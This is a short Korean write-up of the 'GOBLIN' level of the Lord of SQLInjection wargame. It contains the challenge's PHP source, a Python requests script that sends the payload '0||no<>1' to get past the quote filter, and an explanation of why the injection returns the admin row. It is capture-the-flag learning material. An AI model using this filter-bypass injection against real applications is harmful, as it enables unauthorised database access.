## GOBLIN Write-up

### 문제
``` php
<?php  
include "./config.php";  
login_chk();  
dbconnect();  
if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~");  
if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~");  
$query = "select id from prob_goblin where id='guest' and no={$_GET[no]}";  
echo "<hr>query : <strong>{$query}</strong><hr><br>";  
$result = @mysql_fetch_array(mysql_query($query));  
if($result['id']) echo "<h2>Hello {$result[id]}</h2>";  
if($result['id'] == 'admin') solve("goblin");  
highlight_file(__FILE__);  
?>

```
### Exploit 코드
``` python
import requests

url = 'http://los.rubiya.kr/goblin_e5afb87a6716708e3af46a849517afdc.php'
cookies = {'PHPSESSID' : 'My PHPSESSID'}
params = {}
params['no'] = "0||no<>1"

res = requests.get(url, cookies = cookies, params = params)

if "Clear" in res.text :
    print("[♪] GOBLIN Clear!")
```



``` php
select id from prob_goblin where id='guest' and no=0||no<>1
```
mysql에서 **<>** 기호는 같지 않다는 의미이기 때문에 **no!=1** 과 같은 의미가 된다.  
**$result['id']** 에 guest가 아닌 다른 값, admin이 있기 때문에 문제가 해결된다.
